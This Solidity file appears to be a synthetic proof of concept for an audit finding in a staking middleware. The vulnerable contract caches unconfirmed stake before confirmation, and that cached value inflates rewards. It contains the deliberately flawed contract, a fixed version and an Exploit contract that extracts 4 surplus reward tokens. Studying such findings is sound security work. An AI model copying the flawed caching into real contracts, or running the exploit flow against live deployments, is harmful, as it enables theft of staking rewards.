// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Suzaku AvalancheL1Middleware — stake cache is written before P-Chain confirmation
    (Cyfrin / 0kage, #61236, July 2025).
    SYNTHETIC, cheatcode-free. No vm.warp: the middleware epoch counter is the
    same value the real contract reads from time, advanced inside one transaction.
    initializeValidatorStakeUpdate writes nodeStakeCache[epoch+1] immediately.
    The next epoch's reward uses that unconfirmed stake.
    Confirmed stake 10 ether pays 1 RWD. Unconfirmed 50 ether pays 5 RWD.
    Extra reward is 4 RWD. Control leaves the cache at the confirmed stake
    until completeStakeUpdate. */

contract Token {
    string public constant name = "Reward";
    string public constant symbol = "RWD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Middleware {
    uint96 public constant PRIMARY_ASSET_CLASS = 1;
    bytes32 public validationID;

    uint48 public epochNow;
    mapping(uint48 => mapping(bytes32 => uint256)) public nodeStakeCache;
    mapping(bytes32 => bool) public nodePendingUpdate;

    constructor() {
        validationID = bytes32(uint256(1));
    }

    function getCurrentEpoch() public view returns (uint48) {
        return epochNow;
    }

    function setEpoch(uint48 epoch) external {
        epochNow = epoch;
    }

    function seedConfirmedStake(uint256 stake) external {
        epochNow = 1;
        nodeStakeCache[1][validationID] = stake;
        nodeStakeCache[2][validationID] = stake;
    }

    function getEffectiveNodeStake(uint48 epoch, bytes32 validationID_) public view returns (uint256) {
        return nodeStakeCache[epoch][validationID_];
    }

    function getOperatorUsedStakeCachedPerEpoch(uint48 epoch, address operator, uint96 assetClass)
        external
        view
        returns (uint256)
    {
        uint256 registeredStake = nodeStakeCache[epoch][validationID];
        if (operator != address(0)) {
            registeredStake += assetClass - assetClass;
        }
        return registeredStake;
    }

    function initializeValidatorStakeUpdate(uint256 newStake) external {
        uint48 currentEpoch = getCurrentEpoch();
        nodePendingUpdate[validationID] = true;
        // FIX: store newStake in _pendingStake and write nodeStakeCache only in completeStakeUpdate
        // @> VULN: next-epoch stake is cached before the P-Chain confirms the weight update
        nodeStakeCache[currentEpoch + 1][validationID] = newStake;
    }
}

contract MiddlewareFixed {
    uint96 public constant PRIMARY_ASSET_CLASS = 1;
    bytes32 public constant validationID = bytes32(uint256(1));

    uint48 public epochNow;
    mapping(uint48 => mapping(bytes32 => uint256)) public nodeStakeCache;
    mapping(bytes32 => bool) public nodePendingUpdate;
    mapping(bytes32 => uint256) public pendingStake;

    function getCurrentEpoch() public view returns (uint48) {
        return epochNow;
    }

    function setEpoch(uint48 epoch) external {
        epochNow = epoch;
    }

    function seedConfirmedStake(uint256 stake) external {
        epochNow = 1;
        nodeStakeCache[1][validationID] = stake;
        nodeStakeCache[2][validationID] = stake;
    }

    function getEffectiveNodeStake(uint48 epoch, bytes32 validationID_) public view returns (uint256) {
        return nodeStakeCache[epoch][validationID_];
    }

    function getOperatorUsedStakeCachedPerEpoch(uint48 epoch, address, uint96) external view returns (uint256 registeredStake) {
        registeredStake += getEffectiveNodeStake(epoch, validationID);
    }

    function initializeValidatorStakeUpdate(uint256 newStake) external {
        pendingStake[validationID] = newStake;
        nodePendingUpdate[validationID] = true;
    }

    function completeStakeUpdate() external {
        require(nodePendingUpdate[validationID], "no pending");
        uint48 currentEpoch = getCurrentEpoch();
        nodeStakeCache[currentEpoch + 1][validationID] = pendingStake[validationID];
        nodePendingUpdate[validationID] = false;
    }
}

interface IStakeMiddleware {
    function getCurrentEpoch() external view returns (uint48);
    function PRIMARY_ASSET_CLASS() external view returns (uint96);
    function getOperatorUsedStakeCachedPerEpoch(uint48 epoch, address operator, uint96 assetClass)
        external
        view
        returns (uint256);
}

contract Rewards {
    IStakeMiddleware public middleware;
    Token public rewardToken;
    uint256 public lastPaid;

    constructor(IStakeMiddleware _middleware, Token _rewardToken) {
        middleware = _middleware;
        rewardToken = _rewardToken;
    }

    function distributeOperatorReward(address operator, address recipient) external returns (uint256 paid) {
        uint48 epoch = middleware.getCurrentEpoch();
        uint96 assetClass = middleware.PRIMARY_ASSET_CLASS();
        uint256 used = middleware.getOperatorUsedStakeCachedPerEpoch(epoch, operator, assetClass);
        paid = used / 10;
        lastPaid = paid;
        rewardToken.transfer(recipient, paid);
    }
}

contract Exploit {
    uint256 public constant CONFIRMED = 10 ether;
    uint256 public constant NEW_STAKE = 50 ether;
    uint256 public constant FAIR = 1 ether;
    uint256 public constant INFLATED = 5 ether;
    uint256 public constant EXTRA = 4 ether;

    Token public reward;
    Middleware public middleware;
    Rewards public rewards;
    uint256 public cachedStake;
    bool public stillPending;
    uint256 public inflatedPaid;
    uint256 public extraPaid;

    constructor() {
        reward = new Token();
        middleware = new Middleware();
        rewards = new Rewards(IStakeMiddleware(address(middleware)), reward);
    }

    function run() external {
        middleware.seedConfirmedStake(CONFIRMED);
        reward.mint(address(rewards), INFLATED);
        middleware.initializeValidatorStakeUpdate(NEW_STAKE);
        cachedStake = middleware.nodeStakeCache(middleware.getCurrentEpoch() + 1, middleware.validationID());
        require(cachedStake == NEW_STAKE, "unconfirmed stake cached");
        stillPending = middleware.nodePendingUpdate(middleware.validationID());
        require(stillPending, "P-Chain still pending");
        middleware.setEpoch(2);
        uint256 paid = rewards.distributeOperatorReward(address(this), address(this));
        require(paid == INFLATED, "paid the unconfirmed stake");
        inflatedPaid = paid;
        extraPaid = paid - FAIR;
        reward.transfer(msg.sender, extraPaid);
        require(extraPaid == EXTRA, "extra reward");
        require(reward.balanceOf(msg.sender) == EXTRA, "attacker received the extra");
    }
}
